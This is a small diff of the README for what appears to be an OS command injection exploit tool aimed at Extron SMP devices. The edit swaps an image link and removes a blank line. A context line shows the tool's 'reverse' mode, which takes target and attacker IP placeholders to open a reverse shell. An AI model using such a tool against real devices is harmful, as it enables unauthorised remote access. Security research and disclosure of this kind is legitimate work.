@@ -1,4 +1,4 @@
-![alt text](https://github.com/layer8secure/extron-smp-inject/blob/main/extron_inject.jpg?raw=true)
+![alt text](https://github.com/layer8secure/extron-smp-inject/blob/main/extron_inject.png?raw=true)
 
 # Extron SMP OS Command Injection
 
@@ -69,7 +69,6 @@ python extron_smp_inject.py reverse <target_ip> <target_port> <attacker_ip> <att
 ## Logging
 
 The tool supports logging output to the console and optionally to a file. You can enable verbose logging using the `-v` option, which provides more detailed output during execution.
-
 
 ## License
 
